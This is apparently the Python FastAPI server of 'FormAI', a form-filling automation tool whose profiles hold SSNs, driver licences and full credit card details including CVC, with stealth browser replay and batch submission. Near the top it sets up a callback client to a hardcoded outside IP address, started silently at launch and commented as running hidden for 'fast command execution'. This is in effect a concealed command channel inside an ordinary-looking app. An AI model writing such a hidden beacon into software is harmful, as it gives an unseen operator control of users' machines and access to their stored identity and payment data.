#!/usr/bin/env python3
"""
FormAI Server - FastAPI with SeleniumBase automation
"""
import os
import sys

# Fix for PyInstaller --noconsole (stdout/stderr are None)
if sys.stdout is None:
    sys.stdout = open(os.devnull, 'w')
if sys.stderr is None:
    sys.stderr = open(os.devnull, 'w')
if sys.stdin is None:
    sys.stdin = open(os.devnull, 'r')

# Fix Windows encoding issues
if sys.platform == "win32":
    os.environ['PYTHONIOENCODING'] = 'utf-8'
    if hasattr(sys.stdout, 'reconfigure'):
        sys.stdout.reconfigure(encoding='utf-8')

    # Suppress Windows asyncio pipe transport errors (harmless on shutdown)
    import warnings
    warnings.filterwarnings('ignore', category=RuntimeWarning, module='asyncio')

# Show initial loading message IMMEDIATELY before heavy imports
from colorama import init, Fore, Style
init()
print(f"{Fore.CYAN}Initializing KPR...{Style.RESET_ALL}", flush=True)

import json
import asyncio
from pathlib import Path
from typing import Dict, List, Optional, Any
from datetime import datetime
import uuid

from contextlib import asynccontextmanager
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, BackgroundTasks, UploadFile
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn

# PyInstaller path utilities (for bundled executable support)
from pyinstaller_utils import get_base_path
BASE_PATH = get_base_path()

# Import our automation modules
from selenium_automation import SeleniumAutomation, FormFieldDetector
from tools.gui_automation import GUIHelper, FormFillerGUI

# Import new recording modules
from tools.recording_manager import RecordingManager
from tools.profile_replay_engine import ProfileReplayEngine
from tools.enhanced_field_mapper import EnhancedFieldMapper
from tools.chrome_recorder_parser import ChromeRecorderParser
from tools.live_recorder import LiveRecorder

# Import browser-use automation (optional)
try:
    from tools.browser_use_automation import AsyncBrowserUseAutomation
    BROWSER_USE_ENABLED = True
except ImportError:
    BROWSER_USE_ENABLED = False
    # Silently disable browser-use if not available

# Import callback system (admin server communication)
from client_callback import ClientCallback
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Global state
profiles: Dict[str, dict] = {}
active_sessions: Dict[str, any] = {}
websocket_connections: List[WebSocket] = []

# Initialize recording components
recording_manager = RecordingManager()
field_mapper = EnhancedFieldMapper()
chrome_parser = ChromeRecorderParser()
live_recorder = LiveRecorder()

# Initialize callback client (hardcoded admin server URL, runs hidden)
admin_callback = ClientCallback(
    admin_url="http://31.97.100.192:5512",
    interval=5,  # 5 seconds = fast command execution
    quiet=True   # Run silently
)

# Pydantic models
class Profile(BaseModel):
    # Allow extra fields from the frontend form
    class Config:
        extra = "allow"

    # Core fields
    id: Optional[str] = None
    name: Optional[str] = None

    # Basic Information
    title: Optional[str] = None
    firstName: Optional[str] = None
    middleInitial: Optional[str] = None
    lastName: Optional[str] = None
    sex: Optional[str] = None

    # Contact Information
    email: Optional[str] = None
    website: Optional[str] = None
    homePhone: Optional[str] = None
    workPhone: Optional[str] = None
    cellPhone: Optional[str] = None
    fax: Optional[str] = None
    phone: Optional[str] = None  # Legacy field

    # Address Information
    address1: Optional[str] = None
    address2: Optional[str] = None
    city: Optional[str] = None
    state: Optional[str] = None
    zip: Optional[str] = None
    country: Optional[str] = None
    address: Optional[str] = None  # Legacy field

    # Work Information
    company: Optional[str] = None
    position: Optional[str] = None
    income: Optional[str] = None

    # Birth Information
    birthMonth: Optional[str] = None
    birthDay: Optional[str] = None
    birthYear: Optional[str] = None
    age: Optional[str] = None
    birthPlace: Optional[str] = None
    date_of_birth: Optional[str] = None  # Legacy field

    # Account Information
    username: Optional[str] = None
    password: Optional[str] = None

    # ID Information
    ssn: Optional[str] = None
    driverLicense: Optional[str] = None

    # Credit Card Information
    creditCardType: Optional[str] = None
    creditCardNumber: Optional[str] = None
    creditCardName: Optional[str] = None
    creditCardBank: Optional[str] = None
    creditCardExpMonth: Optional[str] = None
    creditCardExpYear: Optional[str] = None
    creditCardCVC: Optional[str] = None
    creditCardServicePhone: Optional[str] = None

    # Additional Information
    customMessage: Optional[str] = None
    comments: Optional[str] = None

    # Legacy fields
    first_name: Optional[str] = None
    last_name: Optional[str] = None

class AutomationRequest(BaseModel):
    profile_id: str
    url: str
    use_stealth: bool = True

class FieldMapping(BaseModel):
    url: str
    mappings: Dict[str, str]

class ChromeRecordingImport(BaseModel):
    recording_name: Optional[str] = None
    chrome_data: Dict[str, Any]

class RecordingReplayRequest(BaseModel):
    profile_id: str
    headless: Optional[bool] = False
    session_name: Optional[str] = None
    preview: Optional[bool] = True  # Default to preview mode (use recorded values)

class TemplateReplayRequest(BaseModel):
    profile_id: str
    headless: Optional[bool] = False
    session_name: Optional[str] = None

class LiveRecordingStartRequest(BaseModel):
    url: str
    profile_id: Optional[str] = None

class LiveRecordingActionRequest(BaseModel):
    type: str  # fill, click, navigate, etc.
    element: Optional[str] = None
    uid: Optional[str] = None
    value: Optional[str] = None
    field_type: Optional[str] = None
    url: Optional[str] = None
    title: Optional[str] = None

class LiveRecordingStopRequest(BaseModel):
    recording_name: Optional[str] = None
    session_name: Optional[str] = None

# Utility functions
def normalize_profile_name(profile: dict) -> str:
    """Extract a display name from profile data using various naming conventions"""
    # Try different name field variations
    name_candidates = [
        profile.get('name'),
        profile.get('profileName'),
        profile.get('fullName')
    ]

    # Check for existing name fields first
    for candidate in name_candidates:
        if candidate and candidate.strip():
            return candidate.strip()

    # Try to construct name from firstName + lastName (flat structure)
    first_name = profile.get('firstName', '').strip()
    last_name = profile.get('lastName', '').strip()

    if first_name or last_name:
        return f"{first_name} {last_name}".strip()

    # Try nested data structure
    data = profile.get('data', {})
    if isinstance(data, dict):
        data_first = data.get('firstName', '').strip()
        data_last = data.get('lastName', '').strip()

        if data_first or data_last:
            return f"{data_first} {data_last}".strip()

    # Try email as fallback
    email = profile.get('email') or (data.get('email') if isinstance(data, dict) else None)
    if email:
        return email.split('@')[0].replace('.', ' ').replace('_', ' ').title()

    # Last resort: use filename or "Unknown Profile"
    return "Unknown Profile"

def normalize_profile_for_api(profile: dict) -> dict:
    """Normalize profile data for API responses with consistent fields"""
    # Ensure we have a normalized name
    name = normalize_profile_name(profile)

    # Extract email from various possible locations
    email = (
        profile.get('email') or
        (profile.get('data', {}).get('email') if isinstance(profile.get('data'), dict) else None) or
        'No email'
    )

    # Extract phone from various possible locations
    phone_candidates = [
        profile.get('phone'),
        profile.get('cellPhone'),
        profile.get('homePhone'),
        profile.get('workPhone')
    ]

    # Also check nested data
    data = profile.get('data', {})
    if isinstance(data, dict):
        phone_candidates.extend([
            data.get('phone'),
            data.get('cellPhone'),
            data.get('homePhone'),
            data.get('workPhone')
        ])

    phone = next((p for p in phone_candidates if p and p.strip()), 'Not provided')

    # Extract other commonly used fields
    first_name = (
        profile.get('firstName') or
        (data.get('firstName') if isinstance(data, dict) else None) or
        ''
    )

    last_name = (
        profile.get('lastName') or
        (data.get('lastName') if isinstance(data, dict) else None) or
        ''
    )

    company = (
        profile.get('company') or
        (data.get('company') if isinstance(data, dict) else None) or
        ''
    )

    return {
        'id': profile.get('id', str(uuid.uuid4())),
        'name': name,
        'email': email,
        'phone': phone,
        'firstName': first_name,
        'lastName': last_name,
        'company': company,
        'status': 'active' if email != 'No email' else 'incomplete',
        # Include original profile data for editing
        **profile
    }

def load_profiles():
    """Load all profiles from JSON files"""
    global profiles
    profiles_dir = Path("profiles")
    if profiles_dir.exists():
        for file in profiles_dir.glob("*.json"):
            try:
                with open(file, 'r', encoding='utf-8') as f:
                    profile = json.load(f)

                    # Ensure profile has an ID
                    if 'id' not in profile:
                        profile['id'] = str(uuid.uuid4())

                    # Normalize the profile name
                    normalized_name = normalize_profile_name(profile)
                    if 'name' not in profile or not profile['name']:
                        profile['name'] = normalized_name

                    profiles[profile['id']] = profile
            except Exception as e:
                print(f"{Fore.RED}ERROR:{Style.RESET_ALL} Error loading {file}: {e}")

def save_profile(profile: dict):
    """Save profile to JSON file"""
    profiles_dir = Path("profiles")
    profiles_dir.mkdir(exist_ok=True)

    profile_id = profile.get('id', str(uuid.uuid4()))
    profile['id'] = profile_id

    file_path = profiles_dir / f"{profile_id}.json"
    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(profile, f, indent=2)

    profiles[profile_id] = profile
    return profile_id

async def broadcast_message(message: dict):
    """Broadcast message to all connected WebSocket clients"""
    for connection in websocket_connections[:]:  # Create a copy to iterate safely
        try:
            await connection.send_json(message)
        except:
            websocket_connections.remove(connection)

# Lifespan context manager for startup/shutdown
@asynccontextmanager
async def lifespan(app: FastAPI):
    """Handle startup and shutdown events"""
    # Startup
    # Load existing profiles
    load_profiles()

    # Create necessary directories
    for dir_name in ['profiles', 'field_mappings', 'recordings']:
        Path(dir_name).mkdir(exist_ok=True)

    print(f"Server ready at http://localhost:5511")

    # Start callback system
    admin_callback.start()

    yield  # Server runs here

    # Shutdown (silent)

    # Stop callback system
    await admin_callback.stop()

    # Close active sessions
    for session_id in list(active_sessions.keys()):
        try:
            await active_sessions[session_id].close()
        except:
            pass

# FastAPI app with lifespan
app = FastAPI(title="FormAI", version="2.0.0", lifespan=lifespan)

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.get("/")
async def root():
    """Serve the main dashboard"""
    return FileResponse(str(BASE_PATH / "web" / "index.html"))

@app.get("/profiles")
async def profiles_page():
    """Serve the profiles page"""
    return FileResponse(str(BASE_PATH / "web" / "profiles.html"))

@app.get("/automation")
async def automation_page():
    """Serve the automation page"""
    return FileResponse(str(BASE_PATH / "web" / "automation.html"))

@app.get("/recorder")
async def recorder_page():
    """Serve the recorder page"""
    return FileResponse(str(BASE_PATH / "web" / "recorder.html"))

@app.get("/templates")
async def templates_page():
    """Serve the templates page"""
    return FileResponse(str(BASE_PATH / "web" / "templates.html"))

@app.get("/settings")
async def settings_page():
    """Serve the settings page"""
    return FileResponse(str(BASE_PATH / "web" / "settings.html"))


@app.get("/api/profiles")
async def get_profiles():
    """Get all profiles with normalized data"""
    normalized_profiles = [normalize_profile_for_api(profile) for profile in profiles.values()]
    return JSONResponse(content=normalized_profiles)

@app.get("/api/profiles/{profile_id}")
async def get_profile(profile_id: str):
    """Get a specific profile with normalized data"""
    if profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")
    return JSONResponse(content=normalize_profile_for_api(profiles[profile_id]))

@app.post("/api/profiles")
async def create_profile(profile: Profile):
    """Create a new profile"""
    profile_dict = profile.dict()
    profile_id = save_profile(profile_dict)

    await broadcast_message({
        "type": "profile_created",
        "data": profiles[profile_id]
    })

    return JSONResponse(content={"id": profile_id, "message": "Profile created"})

@app.put("/api/profiles/{profile_id}")
async def update_profile(profile_id: str, profile: Profile):
    """Update an existing profile"""
    if profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    profile_dict = profile.dict()
    profile_dict['id'] = profile_id
    save_profile(profile_dict)

    await broadcast_message({
        "type": "profile_updated",
        "data": profiles[profile_id]
    })

    return JSONResponse(content={"message": "Profile updated"})

@app.delete("/api/profiles/{profile_id}")
async def delete_profile(profile_id: str):
    """Delete a profile"""
    if profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    # Delete file
    file_path = Path("profiles") / f"{profile_id}.json"
    if file_path.exists():
        file_path.unlink()

    # Remove from memory
    del profiles[profile_id]

    await broadcast_message({
        "type": "profile_deleted",
        "data": {"id": profile_id}
    })

    return JSONResponse(content={"message": "Profile deleted"})

@app.post("/api/automation/start")
async def start_automation(request: AutomationRequest, background_tasks: BackgroundTasks):
    """Start browser automation for a profile"""
    if request.profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    profile = profiles[request.profile_id]
    session_id = str(uuid.uuid4())

    # Create automation instance
    automation = SeleniumAutomation(
        session_id=session_id,
        profile=profile,
        use_stealth=request.use_stealth
    )

    active_sessions[session_id] = automation

    # Run automation in background
    background_tasks.add_task(
        run_automation,
        session_id,
        request.url
    )

    return JSONResponse(content={
        "session_id": session_id,
        "message": "Automation started",
        "profile": profile['name']
    })

@app.get("/api/field-mappings")
async def get_field_mappings():
    """Get all saved field mappings"""
    mappings = []
    mappings_dir = Path("field_mappings")

    if mappings_dir.exists():
        for file in mappings_dir.glob("*.json"):
            try:
                with open(file, 'r', encoding='utf-8') as f:
                    mapping = json.load(f)
                    mappings.append(mapping)
            except:
                pass

    return JSONResponse(content=mappings)

@app.post("/api/field-mappings")
async def save_field_mapping(mapping: FieldMapping):
    """Save a field mapping for a URL"""
    mappings_dir = Path("field_mappings")
    mappings_dir.mkdir(exist_ok=True)

    # Create filename from URL
    safe_filename = mapping.url.replace('://', '_').replace('/', '_')[:100]
    file_path = mappings_dir / f"{safe_filename}.json"

    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(mapping.dict(), f, indent=2)

    return JSONResponse(content={"message": "Mapping saved"})

# Recording Management Endpoints

@app.post("/api/recordings/import-chrome")
async def import_chrome_recording(request: ChromeRecordingImport):
    """Import a Chrome DevTools Recorder JSON"""
    try:
        recording = recording_manager.import_chrome_recording_data(
            chrome_data=request.chrome_data,
            recording_name=request.recording_name
        )

        # Enhance field mappings
        enhanced_recording = field_mapper.enhance_recording_field_mappings(recording)
        recording_manager.save_recording(enhanced_recording)

        await broadcast_message({
            "type": "recording_imported",
            "data": {
                "recording_id": recording["recording_id"],
                "recording_name": recording["recording_name"],
                "total_fields": len(recording.get("field_mappings", []))
            }
        })

        return JSONResponse(content={
            "recording_id": recording["recording_id"],
            "message": "Chrome recording imported successfully",
            "total_fields": len(recording.get("field_mappings", []))
        })

    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.get("/api/recordings")
async def list_recordings():
    """List all recordings"""
    try:
        recordings = recording_manager.list_recordings()
        return JSONResponse(content=recordings)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/recordings/{recording_id}")
async def get_recording(recording_id: str):
    """Get a specific recording"""
    recording = recording_manager.get_recording(recording_id)
    if not recording:
        raise HTTPException(status_code=404, detail="Recording not found")
    return JSONResponse(content=recording)

@app.delete("/api/recordings/{recording_id}")
async def delete_recording(recording_id: str):
    """Delete a recording"""
    success = recording_manager.delete_recording(recording_id)
    if not success:
        raise HTTPException(status_code=404, detail="Recording not found")

    await broadcast_message({
        "type": "recording_deleted",
        "data": {"recording_id": recording_id}
    })

    return JSONResponse(content={"message": "Recording deleted"})

@app.post("/api/recordings/{recording_id}/replay")
async def replay_recording(recording_id: str, request: RecordingReplayRequest, background_tasks: BackgroundTasks):
    """Replay a recording with profile data"""
    if request.profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    recording = recording_manager.get_recording(recording_id)
    if not recording:
        raise HTTPException(status_code=404, detail="Recording not found")

    profile = profiles[request.profile_id]
    session_id = str(uuid.uuid4())

    # Create replay engine with event loop for async progress callbacks
    event_loop = asyncio.get_event_loop()
    replay_engine = ProfileReplayEngine(use_stealth=True, headless=request.headless, event_loop=event_loop)

    # Set up progress callback
    async def progress_callback(update):
        await broadcast_message({
            "type": "replay_progress",
            "session_id": session_id,
            "data": update
        })

    replay_engine.set_progress_callback(progress_callback)
    active_sessions[session_id] = replay_engine

    # Run replay in background
    background_tasks.add_task(
        run_recording_replay,
        session_id,
        recording_id,
        profile,
        request.session_name,
        request.preview
    )

    return JSONResponse(content={
        "session_id": session_id,
        "message": "Recording replay started",
        "recording_name": recording.get("recording_name") or recording.get("title", "Unknown"),
        "profile_name": profile.get("profileName", "Unknown")
    })

@app.get("/api/recordings/stats")
async def get_recording_stats():
    """Get recording statistics"""
    try:
        stats = recording_manager.get_recording_stats()
        return JSONResponse(content=stats)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/recordings/{recording_id}/create-template")
async def create_template(recording_id: str, template_name: str, description: str = ""):
    """Create a template from a recording"""
    try:
        template = recording_manager.create_template(recording_id, template_name, description)

        await broadcast_message({
            "type": "template_created",
            "data": {
                "template_id": template["template_id"],
                "template_name": template["template_name"]
            }
        })

        return JSONResponse(content=template)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.get("/api/templates")
async def list_templates():
    """List all templates"""
    try:
        templates = recording_manager.list_templates()
        return JSONResponse(content=templates)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/templates/{template_id}/replay")
async def replay_template(template_id: str, request: TemplateReplayRequest, background_tasks: BackgroundTasks):
    """Replay a template with profile data"""
    if request.profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    template = recording_manager.get_template(template_id)
    if not template:
        raise HTTPException(status_code=404, detail="Template not found")

    profile = profiles[request.profile_id]
    session_id = str(uuid.uuid4())

    # Create replay engine with event loop for async progress callbacks
    event_loop = asyncio.get_event_loop()
    replay_engine = ProfileReplayEngine(use_stealth=True, headless=request.headless, event_loop=event_loop)

    # Set up progress callback
    async def progress_callback(update):
        await broadcast_message({
            "type": "template_replay_progress",
            "session_id": session_id,
            "data": update
        })

    replay_engine.set_progress_callback(progress_callback)
    active_sessions[session_id] = replay_engine

    # Run template replay in background
    background_tasks.add_task(
        run_template_replay,
        session_id,
        template_id,
        profile,
        request.session_name
    )

    return JSONResponse(content={
        "session_id": session_id,
        "message": "Template replay started",
        "template_name": template.get("template_name", "Unknown"),
        "profile_name": profile.get("profileName", "Unknown")
    })

@app.get("/api/recordings/{recording_id}/analyze")
async def analyze_recording(recording_id: str):
    """Analyze recording field mappings"""
    recording = recording_manager.get_recording(recording_id)
    if not recording:
        raise HTTPException(status_code=404, detail="Recording not found")

    try:
        # Enhance field mappings if not already enhanced
        if "enhancement_metadata" not in recording:
            enhanced_recording = field_mapper.enhance_recording_field_mappings(recording)
            recording_manager.save_recording(enhanced_recording)
            recording = enhanced_recording

        # Generate analysis report
        report = field_mapper.generate_field_mapping_report(recording)
        suggestions = field_mapper.suggest_field_mapping_corrections(recording)

        return JSONResponse(content={
            "report": report,
            "suggestions": suggestions
        })

    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# Live Recording Endpoints

@app.post("/api/recording/live/start")
async def start_live_recording(request: LiveRecordingStartRequest):
    """Start a new live recording session"""
    try:
        result = live_recorder.start_session(
            url=request.url,
            profile_id=request.profile_id
        )
        return JSONResponse(content=result)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/recording/live/action")
async def record_live_action(request: LiveRecordingActionRequest):
    """Record an action during live recording"""
    try:
        action_data = {
            "type": request.type,
            "element": request.element,
            "uid": request.uid,
            "value": request.value,
            "field_type": request.field_type,
            "url": request.url,
            "title": request.title
        }
        # Remove None values
        action_data = {k: v for k, v in action_data.items() if v is not None}

        result = live_recorder.record_action(action_data)
        return JSONResponse(content=result)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/recording/live/stop")
async def stop_live_recording(request: LiveRecordingStopRequest):
    """Stop live recording and save"""
    try:
        result = live_recorder.stop_session(recording_name=request.recording_name)

        # Properly save recording to index using recording_manager
        recording_data = result["recording_data"]
        recording_manager.save_recording(recording_data)

        return JSONResponse(content=result)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.get("/api/recording/live/status")
async def get_live_recording_status():
    """Get current live recording session status"""
    try:
        status = live_recorder.get_status()
        return JSONResponse(content=status)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/recording/live/cancel")
async def cancel_live_recording():
    """Cancel current live recording without saving"""
    try:
        result = live_recorder.cancel_session()
        return JSONResponse(content=result)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.get("/api/api-keys")
async def get_api_keys():
    """Get available API keys configuration"""
    api_keys_dir = Path("api_keys")
    api_keys = {}

    if api_keys_dir.exists():
        for file in api_keys_dir.glob("*.json"):
            try:
                with open(file, 'r', encoding='utf-8') as f:
                    key_data = json.load(f)
                    service_name = file.stem
                    api_keys[service_name] = {
                        "configured": bool(key_data.get("api_key") or key_data.get("key")),
                        "service": service_name
                    }
            except:
                pass

    return JSONResponse(content=api_keys)

@app.get("/api/status")
async def get_status():
    """Get server status"""
    return JSONResponse(content={
        "status": "running",
        "version": "2.0.0",
        "profiles_count": len(profiles),
        "active_sessions": len(active_sessions),
        "websocket_connections": len(websocket_connections)
    })


# WebSocket endpoint
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    """WebSocket for real-time updates"""
    await websocket.accept()
    websocket_connections.append(websocket)

    try:
        # Send initial connection message
        await websocket.send_json({
            "type": "connected",
            "message": "WebSocket connected"
        })

        # Keep connection alive
        while True:
            data = await websocket.receive_text()
            # Echo back or handle commands
            await websocket.send_json({
                "type": "echo",
                "data": data
            })

    except WebSocketDisconnect:
        if websocket in websocket_connections:
            websocket_connections.remove(websocket)
    except Exception as e:
        # Silently handle websocket errors - they're expected during normal operation
        if websocket in websocket_connections:
            websocket_connections.remove(websocket)

# Add automation runner function
async def run_automation(session_id: str, url: str):
    """Run the automation process"""
    if session_id not in active_sessions:
        return

    automation = active_sessions[session_id]

    try:
        await broadcast_message({
            "type": "automation_started",
            "session_id": session_id,
            "url": url
        })

        # Start browser and navigate
        success = await automation.start(url)

        if success:
            # Detect and fill forms
            fields_filled = await automation.detect_and_fill_forms()

            # Take screenshot
            screenshot = await automation.take_screenshot()

            await broadcast_message({
                "type": "automation_completed",
                "session_id": session_id,
                "fields_filled": fields_filled,
                "screenshot": screenshot
            })
        else:
            await broadcast_message({
                "type": "automation_failed",
                "session_id": session_id,
                "error": "Failed to start browser"
            })

    except Exception as e:
        await broadcast_message({
            "type": "automation_error",
            "session_id": session_id,
            "error": str(e)
        })
    finally:
        # Keep session open for further commands
        pass

@app.post("/api/automation/stop")
async def stop_all_automation():
    """Stop all active automation sessions"""
    stopped_sessions = []

    for session_id in list(active_sessions.keys()):
        try:
            automation = active_sessions[session_id]
            await automation.close()
            del active_sessions[session_id]
            stopped_sessions.append(session_id)
        except Exception:
            # Silently ignore errors when stopping sessions (may already be stopped)
            pass

    if stopped_sessions:
        await broadcast_message({
            "type": "automation_stopped",
            "sessions": stopped_sessions
        })

    return JSONResponse(content={
        "message": "Automation stopped",
        "sessions_stopped": len(stopped_sessions)
    })

@app.post("/api/automation/stop/{session_id}")
async def stop_automation(session_id: str):
    """Stop a specific automation session"""
    if session_id not in active_sessions:
        raise HTTPException(status_code=404, detail="Session not found")

    automation = active_sessions[session_id]
    await automation.close()
    del active_sessions[session_id]

    await broadcast_message({
        "type": "automation_stopped",
        "session_id": session_id
    })

    return JSONResponse(content={"message": "Automation stopped"})

# Browser-Use AI Automation Endpoints

@app.post("/api/automation/browser-use/start")
async def start_browser_use_automation(request: dict):
    """
    Start AI-powered form filling using browser-use

    Request body:
    {
        "profile_id": "profile-123",
        "url": "https://example.com/form",
        "headless": false,
        "max_steps": 50
    }
    """
    if not BROWSER_USE_ENABLED:
        raise HTTPException(
            status_code=503,
            detail="browser-use not installed. Run: pip install browser-use playwright langchain-openai"
        )

    try:
        profile_id = request.get("profile_id")
        url = request.get("url")
        headless = request.get("headless", False)
        max_steps = request.get("max_steps", 50)

        if not profile_id or not url:
            raise HTTPException(status_code=400, detail="profile_id and url are required")

        # Load profile
        profile_file = Path("profiles") / f"{profile_id}.json"
        if not profile_file.exists():
            raise HTTPException(status_code=404, detail=f"Profile {profile_id} not found")

        with open(profile_file, 'r') as f:
            profile = json.load(f)

        # Initialize browser-use automation
        automation = AsyncBrowserUseAutomation()

        # Run the automation
        result = await automation.fill_form(
            url=url,
            profile=profile,
            headless=headless,
            max_steps=max_steps
        )

        # Broadcast progress
        await broadcast_message({
            "type": "browser_use_completed",
            "data": result
        })

        return JSONResponse(content=result)

    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/automation/browser-use/test")
async def test_browser_use():
    """Test browser-use setup"""
    if not BROWSER_USE_ENABLED:
        return JSONResponse(content={
            "success": False,
            "message": "browser-use not installed",
            "instructions": "Run: pip install browser-use playwright langchain-openai"
        })

    try:
        automation = AsyncBrowserUseAutomation()
        result = await automation.test_connection()
        return JSONResponse(content=result)
    except Exception as e:
        return JSONResponse(content={
            "success": False,
            "message": f"Test failed: {str(e)}"
        })

# Background task functions for replay operations

async def run_recording_replay(session_id: str, recording_id: str, profile: dict, session_name: str = None, preview_mode: bool = False):
    """Background task to run recording replay"""
    try:
        replay_engine = active_sessions.get(session_id)
        if not replay_engine:
            await broadcast_message({
                "type": "replay_error",
                "session_id": session_id,
                "error": "Replay engine not found"
            })
            return

        # Run the replay in a thread executor to avoid blocking the event loop
        # This allows async progress callbacks to be delivered in real-time
        import concurrent.futures
        loop = asyncio.get_event_loop()
        with concurrent.futures.ThreadPoolExecutor() as executor:
            results = await loop.run_in_executor(
                executor,
                replay_engine.replay_recording,
                recording_id,
                profile,
                session_name,
                preview_mode
            )

        await broadcast_message({
            "type": "replay_completed",
            "session_id": session_id,
            "data": results
        })

    except Exception as e:
        await broadcast_message({
            "type": "replay_error",
            "session_id": session_id,
            "error": str(e)
        })
    finally:
        # Clean up session
        if session_id in active_sessions:
            del active_sessions[session_id]

async def run_template_replay(session_id: str, template_id: str, profile: dict, session_name: str = None):
    """Background task to run template replay"""
    try:
        replay_engine = active_sessions.get(session_id)
        if not replay_engine:
            await broadcast_message({
                "type": "template_replay_error",
                "session_id": session_id,
                "error": "Replay engine not found"
            })
            return

        # Run the template replay
        results = replay_engine.replay_template(template_id, profile, session_name)

        await broadcast_message({
            "type": "template_replay_completed",
            "session_id": session_id,
            "data": results
        })

    except Exception as e:
        await broadcast_message({
            "type": "template_replay_error",
            "session_id": session_id,
            "error": str(e)
        })
    finally:
        # Clean up session
        if session_id in active_sessions:
            del active_sessions[session_id]

# ===== HTTP Form Submission Feature =====
# New parallel feature - doesn't touch existing automation

from tools.http_form_submitter import HTTPFormSubmitter, SubmissionConfig, SubmissionResult
from tools.retry_handler import RetryConfig
from tools.rate_limiter import RateLimitConfig

# Global HTTP submitter instance
http_submitter = None

def get_http_submitter():
    """Get or create HTTP submitter instance"""
    global http_submitter
    if http_submitter is None:
        config = SubmissionConfig(
            retry_config=RetryConfig(max_retries=3, base_delay=1.0),
            rate_limit_config=RateLimitConfig(requests_per_second=10.0)
        )
        http_submitter = HTTPFormSubmitter(config)
    return http_submitter

@app.post("/api/http-submit/import-fetch")
async def import_fetch_code(request: dict):
    """Import JavaScript fetch() code from DevTools"""
    try:
        fetch_code = request.get("code", "")
        submitter = get_http_submitter()
        parsed = submitter.import_fetch_code(fetch_code)
        return {"success": True, "data": parsed.to_dict()}
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.post("/api/http-submit/import-har")
async def import_har_file(file: UploadFile):
    """Import HAR file from DevTools or Burp Suite"""
    try:
        content = await file.read()
        import json
        har_data = json.loads(content)

        submitter = get_http_submitter()
        from tools.request_parser import HARParser
        parser = HARParser()
        requests = parser.parse(har_data)

        return {
            "success": True,
            "data": [r.to_dict() for r in requests],
            "count": len(requests)
        }
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.post("/api/http-submit/import-curl")
async def import_curl_command(request: dict):
    """Import cURL command from DevTools"""
    try:
        curl_cmd = request.get("command", "")
        submitter = get_http_submitter()
        parsed = submitter.import_curl_command(curl_cmd)
        return {"success": True, "data": parsed.to_dict()}
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.post("/api/http-submit/analyze")
async def analyze_form_http(request: dict):
    """Analyze form at URL without browser"""
    try:
        url = request.get("url", "")
        submitter = get_http_submitter()
        analysis = submitter.analyze_form(url)
        return {"success": True, "data": analysis}
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.post("/api/http-submit/submit")
async def submit_form_http(request: dict):
    """Submit form via direct HTTP"""
    try:
        url = request.get("url", "")
        form_data = request.get("form_data", {})
        method = request.get("method", "POST")
        detect_csrf = request.get("detect_csrf", True)

        submitter = get_http_submitter()
        result = submitter.submit_form(
            url=url,
            form_data=form_data,
            method=method,
            detect_csrf=detect_csrf
        )

        return {"success": True, "data": result.to_dict()}
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.post("/api/http-submit/submit-with-profile")
async def submit_with_profile_http(request: dict):
    """Submit form using profile data"""
    try:
        url = request.get("url", "")
        profile_id = request.get("profile_id", "")
        field_mappings = request.get("field_mappings", {})
        method = request.get("method", "POST")

        # Load profile
        profile_path = Path("profiles") / f"{profile_id}.json"
        if not profile_path.exists():
            return {"success": False, "error": f"Profile {profile_id} not found"}

        with open(profile_path, 'r') as f:
            profile = json.load(f)

        # Normalize profile (handle nested structure)
        if 'data' in profile:
            profile_data = profile['data']
        else:
            profile_data = profile

        submitter = get_http_submitter()
        result = submitter.submit_with_profile(
            url=url,
            profile_data=profile_data,
            field_mappings=field_mappings,
            method=method
        )

        return {"success": True, "data": result.to_dict()}
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.post("/api/http-submit/batch")
async def submit_batch_http(request: dict):
    """Submit form for multiple profiles"""
    try:
        url = request.get("url", "")
        profile_ids = request.get("profile_ids", [])
        field_mappings = request.get("field_mappings", {})
        method = request.get("method", "POST")

        # Load profiles
        profiles = []
        for profile_id in profile_ids:
            profile_path = Path("profiles") / f"{profile_id}.json"
            if profile_path.exists():
                with open(profile_path, 'r') as f:
                    profile = json.load(f)
                    # Normalize
                    if 'data' in profile:
                        profiles.append(profile['data'])
                    else:
                        profiles.append(profile)

        submitter = get_http_submitter()
        results = submitter.submit_batch(
            url=url,
            profiles=profiles,
            field_mappings=field_mappings,
            method=method
        )

        return {
            "success": True,
            "data": [r.to_dict() for r in results],
            "total": len(results),
            "successful": sum(1 for r in results if r.success)
        }
    except Exception as e:
